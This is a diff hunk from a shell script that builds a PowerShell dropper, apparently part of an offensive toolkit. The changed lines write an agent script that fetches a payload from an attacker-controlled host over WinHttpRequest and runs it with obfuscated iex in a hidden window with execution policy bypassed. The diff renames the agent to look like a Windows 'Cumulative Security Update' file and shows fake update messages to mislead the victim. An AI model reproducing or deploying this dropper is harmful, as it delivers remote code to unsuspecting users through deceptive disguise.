@@ -12061,8 +12061,8 @@ echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 
 
 ## Attempting to hidde powershell execution terminal
-# DESCRIPTION: dropper.ps1 will write in $env:tmp folder the dropper/exec (Agent.ps1)
-# and then execute it in a powershell hidden console <-- need to know if this works ..
+# DESCRIPTION: dropper.ps1 will write in $env:tmp folder the dropper/exec (KB4524147_4nF7.ps1)
+# and then execute it in a powershell hidden console <-- need to know if this works (BETA) ..
 # HOW TO: 1º - Comment (#) the above dropper build (line 12047 to 12060)
 # 2º - Un-Comment (#) this follow dropper build (line 12069 to 12083)
 # ---
@@ -12075,12 +12075,12 @@ echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
 #echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
 #echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\";" >> $IPATH/output/$Drop.ps1
 #echo "Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
-#echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\Agent.ps1" >> $IPATH/output/$Drop.ps1
-#echo "Start-Sleep -seconds 1;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\Agent.ps1\"" >> $IPATH/output/$Drop.ps1
+#echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+#echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+#echo "Start-Sleep -seconds 1;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1
 ## --- END - Attempting to hidde powershell execution terminal
 
 
